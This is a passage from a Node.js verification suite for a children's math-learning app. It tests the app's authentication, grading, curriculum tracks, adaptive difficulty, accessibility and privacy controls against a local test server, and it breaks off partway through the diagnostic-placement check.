/* Automated verification for requirements marked `done`.
   Each check id is referenced from register.json `evidence`.
   Run with: node requirements/verify.mjs */

import { spawn } from "node:child_process";
import { rmSync } from "node:fs";

const PORT = 4123;
const BASE = `http://localhost:${PORT}`;
const DB = "./data/verify.db";

/* Some checks import server modules directly to test pure logic. db.js reads
   DB_FILE once at import time, so it must be set here, before any of those
   imports run, or the module would open a second database of its own. */
process.env.DB_FILE = "app/server/data/verify.db";

export async function withServer(fn) {
  /* Reset the whole database, sidecars included.

     SQLite in WAL mode keeps two files beside the database: -wal holds
     committed pages not yet folded back in, and -shm indexes it. Deleting
     only the main file leaves both behind describing a database that no
     longer exists, and the next run starts a fresh database next to a
     write-ahead log belonging to the old one. That mismatch surfaces later,
     somewhere else, as "disk I/O error" from whichever connection happens to
     touch it first — which is why the failures looked random and landed on
     unrelated checks.

     The server must be gone before this runs, which is what the awaited exit
     in the `finally` below guarantees. An earlier attempt at this deleted the
     sidecars while the previous server was still checkpointing into them and
     made things reliably worse. */
  const dbPath = "app/server/" + DB.replace("./", "");
  for (const suffix of ["", "-wal", "-shm"]) rmSync(dbPath + suffix, { force: true });
  const srv = spawn("node", ["src/index.js"], {
    cwd: "app/server",
    env: { ...process.env, PORT: String(PORT), DB_FILE: DB,
           /* The suite creates many accounts; the production signup limit is
              not what these checks are testing. The LOGIN limit, which is the
              brute-force control that matters, is still exercised in full by
              check:security-privacy. */
           REGISTER_LIMIT_PER_HOUR: "1000",
           ADMIN_EMAILS: "boss@b.com" },
    stdio: "ignore"
  });
  try {
    await waitFor(`${BASE}/health`);
    return await fn();
  } finally {
    /* Wait for the process to actually exit, not just for the signal to be
       sent. kill() returns immediately; the server still has to close its
       database and check the write-ahead log back in. Returning before that
       hands the next run a database that is still being written to. */
    /* If the child has already gone, there is no "exit" event left to hear,
       so check first rather than waiting for one that will never arrive. The
       fallback timer is deliberately NOT unref'd: an unref'd timer does not
       hold the event loop open, so when it was the only thing left Node
       exited with an unsettled top-level await (exit code 13) instead of
       finishing the run. It is cleared as soon as the race is decided. */
    const ended = srv.exitCode !== null || srv.signalCode !== null
      ? Promise.resolve()
      : new Promise(resolve => srv.once("exit", resolve));
    srv.kill();
    let timer;
    await Promise.race([ended, new Promise(r => { timer = setTimeout(r, 5000); })]);
    clearTimeout(timer);
  }
}

async function waitFor(url, tries = 40) {
  for (let i = 0; i < tries; i++) {
    try { const r = await fetch(url); if (r.ok) return; } catch {}
    await new Promise(r => setTimeout(r, 150));
  }
  throw new Error("server did not start");
}

/* a tiny cookie-aware client */
/* This suite spawns several standalone servers (schema-migration,
   resilience, scheduled-backup, production-build) alongside the one shared
   server most checks use, and running many of them back to back on one
   machine occasionally starves a connection to the shared server for a
   moment -- a raw ECONNREFUSED/reset from `fetch` throwing, not an HTTP
   response. That is retried a couple of times; an actual HTTP response
   (200, 403, 500, whatever) is never retried, since that would mask a real
   assertion failure as flakiness. */
async function fetchWithRetry(url, opts, tries = 3) {
  for (let i = 0; i < tries; i++) {
    try { return await fetch(url, opts); }
    catch (e) {
      if (i === tries - 1) throw e;
      await new Promise(r => setTimeout(r, 150 * (i + 1)));
    }
  }
}

function client() {
  let cookie = "";
  const fn = async (path, opts = {}) => {
    const res = await fetchWithRetry(BASE + "/api" + path, {
      ...opts,
      headers: { "Content-Type": "application/json", ...(cookie ? { cookie } : {}), ...(opts.headers || {}) }
    });
    const sc = res.headers.getSetCookie?.() || [];
    if (sc.length) cookie = sc.map(c => c.split(";")[0]).join("; ");
    return { status: res.status, body: await res.json().catch(() => ({})), setCookie: sc };
  };
  /* Exposed for the rare check that needs the raw session cookie -- e.g. to
     fetch a non-JSON response like the printable HTML report directly. */
  Object.defineProperty(fn, "cookie", { get: () => cookie });
  return fn;
}
const post = (c, p, b) => c(p, { method: "POST", body: JSON.stringify(b) });

const assert = (cond, msg) => { if (!cond) throw new Error(msg); };

/* The correct answer to a bank question, in the shape the grader expects.

   Read from the bank rather than replayed from what /answer returns. That
   endpoint's `correctAnswer` is written for a child to read — ordering comes
   back as "a  →  b  →  c" and a plot as "(3, −2)" — so feeding it back does
   not grade as correct, and a checker built on it silently marks known-good
   answers wrong. Adding a question type used to break several checks at once
   for exactly that reason; adding the type here fixes all of them together. */
let _bank = null;
async function correctAnswerFor(qid, c) {
  _bank ||= (await import("../app/shared/questions.mjs")).QUESTIONS;
  const [topicId, idxRaw] = String(qid).split(":");
  const q = _bank[topicId]?.[Number(idxRaw)];
  /* Generated questions are rebuilt from a seed and have no bank entry, so
     there is nothing to read the answer out of. For those the round-trip
     through /answer is the only route — and it is safe there, because
     generated items are numeric. */
  if (!q) {
    if (!c) return null;
    return (await post(c, "/answer", { questionId: qid, answer: "__none__" })).body.correctAnswer;
  }
  switch (q.type) {
    case "mc": return q.a;
    case "order": return q.ansOrder;
    case "multi": return q.aMulti;
    case "pair": return q.ansP;
    case "plot": return q.plotRule
      ? Array.from({ length: q.plotRule.need || 2 },
                   (_, i) => [i, q.plotRule.m * i + q.plotRule.c])
      : q.ansPlot;
    default: return q.ans;
  }
}

export const CHECKS = {
  /* X.2 — passwords hashed, session cookie is httpOnly, bad input refused */
  "auth-security": async () => {
    const c = client();
    const weak = await post(c, "/auth/register", { email: "a@b.com", password: "short", name: "A", coppaConsent: true });
    assert(weak.status === 400, "weak password was accepted");

    const reg = await post(c, "/auth/register", { email: "a@b.com", password: "a-long-enough-pass", name: "A", coppaConsent: true });
    assert(reg.status === 200, "registration failed");
    const cookie = reg.setCookie.join(";");
    assert(/httponly/i.test(cookie), "session cookie is not HttpOnly");
    assert(!/a-long-enough-pass/.test(JSON.stringify(reg.body)), "password echoed back");

    const dup = await post(c, "/auth/register", { email: "a@b.com", password: "a-long-enough-pass", name: "A", coppaConsent: true });
    assert(dup.status === 409, "duplicate email accepted");

    const bad = await post(client(), "/auth/login", { email: "a@b.com", password: "wrong-password-here" });
    assert(bad.status === 401, "wrong password accepted");
    assert(bad.body.error === "bad_credentials", "login leaks which field was wrong");

    // password must not be recoverable from the database
    const { DatabaseSync } = await import("node:sqlite");
    const db = new DatabaseSync("app/server/data/verify.db");
    const row = db.prepare("SELECT pass_hash, pass_salt FROM users LIMIT 1").get();
    assert(row && !row.pass_hash.includes("a-long-enough-pass"), "password stored in plaintext");
    assert(row.pass_salt && row.pass_salt.length >= 16, "salt missing or too short");
    return "hashed+salted, httpOnly cookie, weak/dup/wrong all refused";
  },

  /* X.1 — the client never receives answers */
  "no-answer-leak": async () => {
    const c = client();
    const r = await c("/topics/g6-ratios/practice/questions");
    assert(r.status === 200, "questions did not load");
    const raw = JSON.stringify(r.body);
    for (const key of ['"ans"', '"ansP"', '"expl"', '"a":']) {
      assert(!raw.includes(key), `answer field ${key} leaked to client`);
    }
    assert(r.body.questions.length > 0, "no questions returned");
    return `${r.body.questions.length} questions, no answer fields present`;
  },

  /* 7.1 — server grades, and grades correctly */
  "grading": async () => {
    const c = client();
    const right = await post(c, "/answer", { questionId: "g6-ratios:2", answer: "0.5" });
    assert(right.body.correct === true, "correct answer marked wrong");
    assert(right.body.explanation, "no explanation returned");
    const wrong = await post(c, "/answer", { questionId: "g6-ratios:2", answer: "9" });
    assert(wrong.body.correct === false, "wrong answer marked correct");
    const junk = await post(c, "/answer", { questionId: "g6-ratios:2", answer: "banana" });
    assert(junk.body.correct === false, "junk accepted as correct");
    const bogus = await post(c, "/answer", { questionId: "nope:1", answer: "1" });
    assert(bogus.status === 400, "unknown question not rejected");
    return "correct/incorrect/junk/unknown all handled server-side";
  },

  /* 3.3.1 + 7.4 — hint ladder, one level at a time, level 3 is the solution */
  "hint-ladder": async () => {
    const c = client();
    const qs = (await c("/topics/g6-ratios/practice/questions")).body.questions;
    const id = qs[0].id;
    const h1 = await post(c, "/hint", { questionId: id, level: 1 });
    const h2 = await post(c, "/hint", { questionId: id, level: 2 });
    const h3 = await post(c, "/hint", { questionId: id, level: 3 });
    assert(h1.body.hint && h2.body.hint && h3.body.hint, "a hint level returned nothing");
    assert(h1.body.hint !== h3.body.hint, "hint levels are identical");
    assert(h3.body.last === true, "level 3 not flagged as final");
    assert(h1.body.last !== true, "level 1 wrongly flagged as final");
    // level 1 must not be the full solution
    const solution = (await post(c, "/answer", { questionId: id, answer: "___" })).body.explanation;
    assert(h1.body.hint !== solution, "first hint gives away the full solution");
    return "3 distinct levels, level 1 is not the solution, level 3 is final";
  },

  /* 4.2.1 — parent manages multiple children */
  "learners-crud": async () => {
    const c = client();
    await post(c, "/auth/register", { coppaConsent: true, email: "crud@b.com", password: "a-long-enough-pass", name: "P" });
    const a = await post(c, "/learners", { name: "Kid A", beast: "pip" });
    const b = await post(c, "/learners", { name: "Kid B", beast: "nim" });
    assert(a.status === 200 && b.status === 200, "could not create learners");
    let list = (await c("/learners")).body.learners;
    assert(list.length === 2, `expected 2 learners, got ${list.length}`);
    const noName = await post(c, "/learners", { name: "  " });
    assert(noName.status === 400, "blank learner name accepted");
    await c(`/learners/${a.body.learner.id}`, { method: "DELETE" });
    list = (await c("/learners")).body.learners;
    assert(list.length === 1, "delete did not remove the learner");
    return "create, list, validate and delete all behave";
  },

  /* 4.2.2 — a child follows core, enrichment or competition, and the setting
     decides what curriculum they are actually offered rather than labelling
     the record. A core learner must not be shown advanced units at all. */
  "curriculum-track": async () => {
    const c = client();
    await post(c, "/auth/register", { coppaConsent: true, email: "track@b.com", password: "a-long-enough-pass", name: "P" });

    const core = (await post(c, "/learners", { name: "Core Kid" })).body.learner;
    assert(core.track === "core", `default track should be core, got ${core.track}`);

    const comp = (await post(c, "/learners", { name: "Comp Kid", track: "competition" })).body.learner;
    assert(comp.track === "competition", "track was not stored on create");

    // A typo must be refused, not quietly narrowed to core — that would shrink
    // a child's curriculum without anyone noticing.
    const bogus = await post(c, "/learners", { name: "Nope", track: "olympiad" });
    assert(bogus.status === 400, `unknown track accepted (${bogus.status})`);

    const coreView = (await c(`/learners/${core.id}/curriculum`)).body;
    const compView = (await c(`/learners/${comp.id}/curriculum`)).body;
    const units = v => Object.values(v.curriculum).flatMap(g => g.units);
    const coreUnits = units(coreView), compUnits = units(compView);

    assert(coreUnits.length > 0, "core learner was shown no curriculum at all");
    assert(coreUnits.every(u => u.track === "core"),
      "a core learner was shown advanced units");
    assert(compUnits.some(u => u.track === "adv"),
      "a competition learner was not shown any advanced units");
    assert(compUnits.length > coreUnits.length,
      `competition (${compUnits.length}) should cover more than core (${coreUnits.length})`);

    // And it can be changed afterwards, which is the point of the setting.
    const moved = await c(`/learners/${core.id}`, { method: "PATCH", body: JSON.stringify({ track: "enrichment" }) });
    assert(moved.status === 200 && moved.body.learner.track === "enrichment", "track could not be changed");
    const after = units((await c(`/learners/${core.id}/curriculum`)).body);
    assert(after.some(u => u.track === "adv"), "curriculum did not widen after the change");

    const badPatch = await c(`/learners/${comp.id}`, { method: "PATCH", body: JSON.stringify({ track: "nonsense" }) });
    assert(badPatch.status === 400, "unknown track accepted on update");

    return `3 tracks, core sees ${coreUnits.length} units vs competition ${compUnits.length}, changes take effect`;
  },

  /* 4.2.3 — progress monitoring: level, mastery, time spent and readiness.
     Time is measured on the server wherever a session exists, and rounds from
     before durations were kept are reported as unmeasured rather than as
     instant. Readiness is several signals, not one number. */
  "progress-monitoring": async () => {
    const c = client();
    await post(c, "/auth/register", { coppaConsent: true, email: "monitor@b.com", password: "a-long-enough-pass", name: "P" });
    const kid = (await post(c, "/learners", { name: "Monitored" })).body.learner;

    // A server-timed round: play a full adaptive session so the duration is
    // measured rather than reported by the caller.
    const start = await post(c, "/practice/start", { learnerId: kid.id, topicId: "k-count" });
    assert(start.status === 200, `could not start practice (${start.status})`);
    let sid = start.body.sessionId, done = false, guard = 0;
    while (!done && guard++ < 40) {
      const step = await post(c, "/practice/answer", { sessionId: sid, answer: "0" });
      if (step.status !== 200) break;
      done = step.body.done;
      if (done) assert(typeof step.body.summary.seconds === "number", "round did not report its duration");
    }

    const time = (await c(`/learners/${kid.id}/time`)).body;
    assert(time.rounds >= 1, "no rounds counted");
    assert(time.measuredRounds >= 1, "the played round was not measured");
    assert(typeof time.totalSeconds === "number", "no total time reported");
    assert(Array.isArray(time.byTopic) && time.byTopic.length >= 1, "no per-topic breakdown");
    assert(Array.isArray(time.byDay) && time.byDay.length >= 1, "no per-day breakdown");
    assert(time.measuredRounds + time.unmeasuredRounds === time.rounds,
      "measured and unmeasured rounds do not account for every round");

    // A browser tab left open overnight must not register as hours of study.
    const inflated = await post(c, "/runs",
      { learnerId: kid.id, topicId: "k-count", tier: "practice", score: 5, total: 5, seconds: 999999 });
    assert(inflated.status === 200, "run was refused");
    const after = (await c(`/learners/${kid.id}/time`)).body;
    assert(after.totalSeconds < 3 * 60 * 60, `client-reported time was not clamped (${after.totalSeconds}s)`);

    const readiness = (await c(`/learners/${kid.id}/readiness`)).body;
    assert(Array.isArray(readiness.signals) && readiness.signals.length >= 5,
      "readiness is not reported as separate signals");
    assert(readiness.ready === false, "a brand new learner was called competition-ready");
    assert(typeof readiness.nextStep === "string" && readiness.nextStep.length > 0,
      "not-ready was reported without a next step");
    assert(readiness.signals.every(s => typeof s.met === "boolean" && "value" in s),
      "a signal carried no evidence");

    // Another account cannot read either view.
    const bob = client();
    await post(bob, "/auth/register", { coppaConsent: true, email: "notmonitor@b.com", password: "a-long-enough-pass", name: "B" });
    assert((await bob(`/learners/${kid.id}/time`)).status === 403, "time leaked across accounts");
    assert((await bob(`/learners/${kid.id}/readiness`)).status === 403, "readiness leaked across accounts");

    return `time aggregated (${after.rounds} rounds, clamped), ${readiness.signals.length} readiness signals with a next step, both access-controlled`;
  },

  /* 6.3 — difficulty chosen by a multi-armed bandit rather than a streak rule.
     The property worth pinning is the reward shape: a bandit rewarded for bare
     correctness converges on the easiest tier and parks the learner there,
     which is the opposite of adaptive. Reward is correctness weighted by
     difficulty, so the optimum is the hardest tier the learner can still
     mostly succeed at. */
  "bandit-difficulty": async () => {
    const bandit = await import("../app/server/src/bandit.js");
    const { db, now } = await import("../app/server/src/db.js");
    const topic = "k-count";
    /* bandit_arms references learners, which references users. Real rows rather
       than a weakened foreign key: the constraint is right, the fixture was not. */
    const mkLearner = id => {
      db.prepare("INSERT OR IGNORE INTO users (id, email, pass_hash, pass_salt, name, created_at) VALUES (?,?,?,?,?,?)")
        .run("bandit-user", "bandit@b.com", "x", "y", "Bandit", now());
      db.prepare("INSERT OR IGNORE INTO learners (id, user_id, name, beast, created_at) VALUES (?,?,?,?,?)")
        .run(id, "bandit-user", id, "vex", now());
      db.prepare("DELETE FROM bandit_arms WHERE learner_id=?").run(id);
      return id;
    };
    const learner = mkLearner("bandit-learner");

    // A learner who succeeds everywhere should be pushed UP, not parked on the
    // easiest tier — this is the failure mode of a correctness-only reward.
    for (let i = 0; i < 20; i++) {
      bandit.observe(learner, topic, "practice", true);
      bandit.observe(learner, topic, "challenge", true);
      bandit.observe(learner, topic, "boss", true);
    }
    assert(bandit.greedyTier(learner, topic) === "boss",
      "a learner succeeding at every tier was not moved to the hardest");

    // A learner who fails the hardest tier consistently should settle lower,
    // and specifically on the hardest tier they still pass often enough that
    // its weighted value beats the easier one.
    const b2 = mkLearner("bandit-learner-2");
    for (let i = 0; i < 20; i++) {
      bandit.observe(b2, topic, "practice", true);
      bandit.observe(b2, topic, "challenge", i < 15);   // 75% success
      bandit.observe(b2, topic, "boss", false);          // always fails
    }
    const settled = bandit.greedyTier(b2, topic);
    assert(settled === "challenge",
      `expected the bandit to settle on challenge, got ${settled}`);

    // Never the easiest tier just because it is safest: challenge at 75% must
    // beat practice at 100%, because it is worth more.
    const armSet = bandit.arms(b2, topic);
    const practice = armSet.find(a => a.tier === "practice");
    const challenge = armSet.find(a => a.tier === "challenge");
    assert(practice.pSuccess > challenge.pSuccess,
      "fixture is wrong: practice should have the higher raw success rate");
    assert(challenge.expectedValue > practice.expectedValue,
      "a safer, easier tier outranked a harder one the learner can handle");

    // Thompson sampling explores while evidence is thin and stops once it is
    // not: a fresh learner must not be pinned to one arm.
    const fresh = mkLearner("bandit-learner-3");
    let seed = 1;
    const rand = () => ((seed = (seed * 1103515245 + 12345) % 2147483648) / 2147483648);
    const seen = new Set();
    for (let i = 0; i < 60; i++) seen.add(bandit.selectTier(fresh, topic, rand));
    assert(seen.size >= 2, `no exploration: only ever picked ${[...seen].join(",")}`);

    // Deterministic given the same stream, or it could not be reasoned about.
    let s1 = 7, s2 = 7;
    const r1 = () => ((s1 = (s1 * 1103515245 + 12345) % 2147483648) / 2147483648);
    const r2 = () => ((s2 = (s2 * 1103515245 + 12345) % 2147483648) / 2147483648);
    assert(bandit.selectTier(b2, topic, r1) === bandit.selectTier(b2, topic, r2),
      "selection is not reproducible from the same random stream");

    return "difficulty-weighted reward: succeeds-everywhere -> boss, fails-boss -> challenge, easiest tier never wins on safety alone";
  },

  /* X.3 — one account cannot read or write another account's learner */
  "tenant-isolation": async () => {
    const alice = client(), bob = client();
    await post(alice, "/auth/register", { coppaConsent: true, email: "alice@b.com", password: "a-long-enough-pass", name: "Alice" });
    const kid = (await post(alice, "/learners", { name: "Alice Kid" })).body.learner;
    await post(bob, "/auth/register", { coppaConsent: true, email: "bob@b.com", password: "a-long-enough-pass", name: "Bob" });

    const read = await bob(`/learners/${kid.id}/progress`);
    assert(read.status === 403, `Bob read Alice's progress (status ${read.status})`);
    const write = await post(bob, "/runs", { learnerId: kid.id, topicId: "g6-ratios", tier: "practice", score: 1, total: 1 });
    assert(write.status === 403, "Bob wrote to Alice's learner");
    const del = await bob(`/learners/${kid.id}`, { method: "DELETE" });
    assert(del.body.deleted === 0, "Bob deleted Alice's learner");

    const anon = client();
    assert((await anon("/learners")).status === 401, "unauthenticated access allowed");
    return "cross-account read, write and delete all refused";
  },

  /* 3.1.1 — K-8 map transcribed from Appendix A, split core vs advanced.
     Spot-checks named topics per grade so the map can't silently regress. */
  "curriculum-appendix-a": async () => {
    const { CURRICULUM } = await import("../app/shared/curriculum.mjs");
    const grades = ["K", "1", "2", "3", "4", "5", "6", "7", "8"];
    for (const g of grades) assert(CURRICULUM[g], `grade ${g} missing`);

    const ids = new Set();
    for (const g of grades) {
      const units = CURRICULUM[g].units;
      const core = units.filter(u => u.track === "core");
      const adv  = units.filter(u => u.track === "adv");
      assert(core.length > 0, `grade ${g} has no core units`);
      assert(adv.length > 0, `grade ${g} has no advanced units`);
      for (const u of units) {
        assert(u.track === "core" || u.track === "adv", `grade ${g} unit "${u.name}" has no valid track`);
        assert(u.topics.length > 0, `grade ${g} unit "${u.name}" has no topics`);
        for (const t of u.topics) {
          assert(t.id && t.name, `grade ${g} unit "${u.name}" has a malformed topic`);
          assert(!ids.has(t.id), `duplicate topic id ${t.id}`);
          ids.add(t.id);
        }
      }
    }

    /* Appendix A promises specific advanced strands at specific grades. */
    const mustHave = {
      K:   ["k-combos", "k-symmetry", "k-evenodd"],
      1:   ["g1-grid", "g1-machines", "g1-div25"],
      2:   ["g2-prime20", "g2-trees", "g2-gcf"],
      3:   ["g3-primefact", "g3-lcm", "g3-multprin"],
      4:   ["g4-clockmod", "g4-euclid", "g4-factorial", "g4-exptheo"],
      5:   ["g5-modarith", "g5-diophant", "g5-bases", "g5-pascal", "g5-expected"],
      6:   ["g6-crt", "g6-binomial", "g6-catalan", "g6-bayes", "g6-transform"],
      7:   ["g7-euler", "g7-graphtheo", "g7-markov", "g7-rsa", "g7-circthm"],
      8:   ["g8-polya", "g8-planar", "g8-clt", "g8-complex", "g8-trig"]
    };
    for (const [g, want] of Object.entries(mustHave)) {
      const have = new Set(CURRICULUM[g].units.flatMap(u => u.topics.map(t => t.id)));
      for (const id of want) assert(have.has(id), `grade ${g} is missing required topic ${id}`);
    }

    /* Every authored question bank must join to a real topic. */
    const { QUESTIONS } = await import("../app/shared/questions.mjs");
    for (const topicId of Object.keys(QUESTIONS)) {
      assert(ids.has(topicId), `question bank "${topicId}" has no matching topic in the curriculum`);
    }

    const topicCount = ids.size;
    const advCount = grades.reduce((a, g) =>
      a + CURRICULUM[g].units.filter(u => u.track === "adv").reduce((b, u) => b + u.topics.length, 0), 0);
    return `9 grades, ${topicCount} topics (${advCount} advanced), all banks joined, spot-checks pass`;
  },

  /* 3.3.2 + 7.6 — mastery is 90% core / 80% advanced, decided server-side */
  "mastery-thresholds": async () => {
    const c = client();
    await post(c, "/auth/register", { coppaConsent: true, email: "mastery@b.com", password: "a-long-enough-pass", name: "M" });
    const kid = (await post(c, "/learners", { name: "Threshold Kid" })).body.learner;

    // The server must publish the split rather than the client assuming it.
    const cur = (await c("/curriculum")).body;
    assert(cur.mastery.core === 90 && cur.mastery.adv === 80, "mastery defaults are not 90/80");
    assert(cur.thresholds["g6-nscoord"] === 90, "core topic threshold is not 90");
    assert(cur.thresholds["g6-crt"] === 80, "advanced topic threshold is not 80");

    const run = (topic, score, total) =>
      post(c, "/runs", { learnerId: kid.id, topicId: topic, tier: "practice", score, total });

    // 85% is below the core bar but above the advanced bar.
    const core85 = await run("g6-nscoord", 85, 100);
    assert(core85.body.pct === 85, "pct miscomputed");
    assert(core85.body.track === "core", "core topic not identified as core");
    assert(core85.body.star === false, "85% wrongly earned a star on a CORE topic (bar is 90)");

    const adv85 = await run("g6-crt", 85, 100);
    assert(adv85.body.track === "adv", "advanced topic not identified as advanced");
    assert(adv85.body.star === true, "85% failed to earn a star on an ADVANCED topic (bar is 80)");

    // Boundaries are inclusive.
    assert((await run("g6-nscoord", 90, 100)).body.star === true, "exactly 90% missed core mastery");
    assert((await run("g6-crt", 80, 100)).body.star === true, "exactly 80% missed advanced mastery");
    assert((await run("g6-crt", 79, 100)).body.star === false, "79% wrongly mastered an advanced topic");

    // Unknown topics and tiers are refused rather than silently recorded.
    assert((await run("not-a-topic", 5, 5)).status === 400, "unknown topic accepted");
    const badTier = await post(c, "/runs",
      { learnerId: kid.id, topicId: "g6-ratios", tier: "nonsense", score: 1, total: 1 });
    assert(badTier.status === 400, "unknown tier accepted");

    return "90 core / 80 advanced enforced server-side, boundaries inclusive, bad input refused";
  },

  /* 10.5 + 13.8 — WCAG 2.1 AA.
     Two halves: axe-core over the real rendered markup, plus a contrast
     audit of the token palette (jsdom cannot compute layout, so axe's
     colour-contrast rule is disabled there and checked here instead). */
  "accessibility-wcag-aa": async () => {
    const { auditAll } = await import("../app/web/a11y/audit.mjs");
    const results = await auditAll();
    const failures = [];
    for (const [screen, violations] of Object.entries(results))
      for (const v of violations) failures.push(`${screen}: [${v.impact}] ${v.id} — ${v.help}`);
    assert(failures.length === 0, "axe violations:\n    " + failures.join("\n    "));
    const screens = Object.keys(results).length;
    assert(screens >= 5, `only ${screens} screens audited`);

    /* Contrast: every foreground/background pair the UI actually uses must
       reach 4.5:1 in BOTH themes (WCAG 1.4.3). */
    const hex = h => { h = h.replace("#", ""); return [0, 2, 4].map(i => parseInt(h.slice(i, i + 2), 16)); };
    const lum = c => { const [r, g, b] = hex(c).map(v => { v /= 255; return v <= 0.03928 ? v / 12.92 : Math.pow((v + 0.055) / 1.055, 2.4); }); return 0.2126 * r + 0.7152 * g + 0.0722 * b; };
    const ratio = (a, b) => { const [x, y] = [lum(a), lum(b)].sort((p, q) => q - p); return (x + 0.05) / (y + 0.05); };

    const { readFileSync } = await import("node:fs");
    const cssText = readFileSync("app/web/src/styles.css", "utf8");
    const tokensIn = block => Object.fromEntries(
      [...block.matchAll(/--([\w-]+)\s*:\s*(#[0-9A-Fa-f]{6})/g)].map(m => [m[1], m[2]]));
    const lightBlock = cssText.slice(cssText.indexOf(":root{"), cssText.indexOf("@media"));
    const darkBlock  = cssText.slice(cssText.indexOf('@media (prefers-color-scheme: dark)'),
                                     cssText.indexOf(':root[data-theme="dark"]'));
    const light = tokensIn(lightBlock), dark = tokensIn(darkBlock);
    assert(Object.keys(light).length > 5 && Object.keys(dark).length > 5, "could not parse theme tokens");

    const pairs = [["ink","card"],["ink","paper"],["muted","card"],["muted","paper"],
                   ["accent","card"],["accent","paper"],["good","card"],["bad","card"],
                   ["star","card"],["accent","chip"],["muted","chip"],["onaccent","accent"]];
    const bad = [];
    for (const [themeName, T] of [["light", light], ["dark", dark]])
      for (const [fg, bg] of pairs) {
        if (!T[fg] || !T[bg]) continue;
        const r = ratio(T[fg], T[bg]);
        if (r < 4.5) bad.push(`${themeName}: ${fg} on ${bg} = ${r.toFixed(2)} (needs 4.5)`);
      }
    assert(bad.length === 0, "contrast failures:\n    " + bad.join("\n    "));

    return `${screens} screens axe-clean (WCAG 2.1 A/AA), ${pairs.length * 2} contrast pairs >= 4.5:1`;
  },


  /* 10.3 — security headers, brute-force limits, audit trail, data rights */
  "security-privacy": async () => {
    const { resetRateLimits } = await import("../app/server/src/security.js").catch(() => ({}));
    const c = client();

    /* Security headers on every response */
    const res = await fetch(BASE + "/health");
    const want = {
      "x-content-type-options": "nosniff",
      "x-frame-options": "DENY",
      "referrer-policy": "no-referrer"
    };
    for (const [h, v] of Object.entries(want))
      assert(res.headers.get(h) === v, `header ${h} is "${res.headers.get(h)}", expected "${v}"`);
    assert(/frame-ancestors 'none'/.test(res.headers.get("content-security-policy") || ""),
      "CSP missing frame-ancestors 'none'");
    assert(!res.headers.get("x-powered-by"), "X-Powered-By still advertises the stack");

    /* COPPA: an account cannot be created without an adult affirming consent */
    const noConsent = await post(c, "/auth/register",
      { email: "noconsent@b.com", password: "a-long-enough-pass", name: "N" });
    assert(noConsent.status === 400 && noConsent.body.error === "coppa_consent_required",
      "account created without COPPA consent");

    await post(c, "/auth/register",
      { email: "sec@b.com", password: "a-long-enough-pass", name: "Sec", coppaConsent: true });

    /* Audit trail records the actions taken */
    const kid = (await post(c, "/learners", { name: "Audited Kid" })).body.learner;
    await c(`/learners/${kid.id}/progress`);
    const trail = (await c("/me/audit")).body.entries.map(e => e.action);
    for (const a of ["account.created", "learner.created", "progress.read"])
      assert(trail.includes(a), `audit trail missing ${a} (has: ${trail.join(", ")})`);

    /* Data export (FERPA/GDPR access right) */
    const exp = (await c("/me/export")).body;
    assert(exp.user && exp.user.email === "sec@b.com", "export missing the user");
    assert(!("pass_hash" in exp.user), "export leaks the password hash");
    assert(Array.isArray(exp.learners) && exp.learners.length === 1, "export missing learners");
    assert(exp.user.coppa_consent_at, "consent timestamp not recorded");

    /* Brute force: repeated bad logins are throttled */
    let limited = false;
    for (let i = 0; i < 14; i++) {
      const r = await post(client(), "/auth/login", { email: "sec@b.com", password: "definitely-wrong" });
      if (r.status === 429) { limited = true; break; }
    }
    assert(limited, "login accepts unlimited password attempts");

    /* Erasure right: deleting the account removes the learner data with it */
    const del = await c("/me", { method: "DELETE" });
    assert(del.body.deleted === true, "account deletion failed");
    const { DatabaseSync } = await import("node:sqlite");
    const db = new DatabaseSync("app/server/data/verify.db");
    const left = db.prepare("SELECT COUNT(*) c FROM learners WHERE id = ?").get(kid.id);
    assert(left.c === 0, "learner data survived account deletion");

    return "headers set, COPPA consent required, audit trail written, export/erase work, login throttled";
  },


  /* 4.1.6 + 7.2 — mastery checks: no hints, server-marked, threshold applied */
  "mastery-check": async () => {
    const c = client();
    await post(c, "/auth/register",
      { coppaConsent: true, email: "check@b.com", password: "a-long-enough-pass", name: "C" });
    const kid = (await post(c, "/learners", { name: "Check Kid" })).body.learner;

    const start = await post(c, "/mastery/start", { learnerId: kid.id, topicId: "g6-ratios" });
    assert(start.status === 200, "could not start a mastery check");
    const { checkId, questions, threshold } = start.body;
    assert(questions.length > 1, "mastery check has too few questions");
    assert(threshold === 90, `core topic check threshold should be 90, got ${threshold}`);

    // Answers must not be present, exactly as in normal practice.
    const raw = JSON.stringify(questions);
    for (const key of ['"ans"', '"ansP"', '"expl"', '"a":'])
      assert(!raw.includes(key), `mastery check leaked ${key}`);

    // Hints must be refused while a check is live (spec 4.1.6: no hints).
    const hint = await post(c, "/hint", { questionId: questions[0].id, level: 1 });
    assert(hint.status === 409, `hints were available during a mastery check (status ${hint.status})`);

    // Deliberately answer everything wrong: the server must mark it, not the client.
    const wrong = {};
    for (const q of questions) wrong[q.id] = q.type === "mc" ? -1 : "-99999";
    const failed = await post(c, "/mastery/submit", { checkId, answers: wrong });
    assert(failed.body.score === 0, `expected 0, server marked ${failed.body.score}`);
    assert(failed.body.passed === false, "a zero score passed the check");
    assert(failed.body.detail.length === questions.length, "no per-question detail returned");

    // A spent check cannot be replayed.
    const replay = await post(c, "/mastery/submit", { checkId, answers: wrong });
    assert(replay.status === 404, "a completed mastery check could be submitted twice");

    // Now pass one, using the grader to discover answers the way a learner would.
    const s2 = (await post(c, "/mastery/start", { learnerId: kid.id, topicId: "g6-ratios" })).body;
    const right = {};
    for (const q of s2.questions) {
      if (q.type === "mc") {
        for (let i = 0; i < q.opts.length; i++) {
          if ((await post(c, "/answer", { questionId: q.id, answer: i })).body.correct) { right[q.id] = i; break; }
        }
      } else {
        right[q.id] = (await post(c, "/answer", { questionId: q.id, answer: "__" })).body.correctAnswer;
      }
    }
    const passed = await post(c, "/mastery/submit", { checkId: s2.checkId, answers: right });
    assert(passed.body.pct === 100, `expected 100%, got ${passed.body.pct}`);
    assert(passed.body.passed === true, "a perfect score did not pass");

    // Recorded against the learner under its own tier.
    const prog = (await c(`/learners/${kid.id}/progress`)).body.progress;
    const row = prog.find(r => r.tier === "mastery" && r.topic_id === "g6-ratios");
    assert(row && row.best_pct === 100, "mastery result not recorded");
    assert(row.runs === 2, `expected 2 attempts recorded, got ${row.runs}`);

    return "server-marked, hints refused (409), no answer leak, replay blocked, result recorded";
  },


  /* 4.1.1 + 6.1 — adaptive diagnostic producing a skill map and placement */
  "diagnostic-placement": async () => {
    const c = client();
    await post(c, "/auth/register",
      { coppaConsent: true, email: "diag@b.com", password: "a-long-enough-pass", name: "D" });
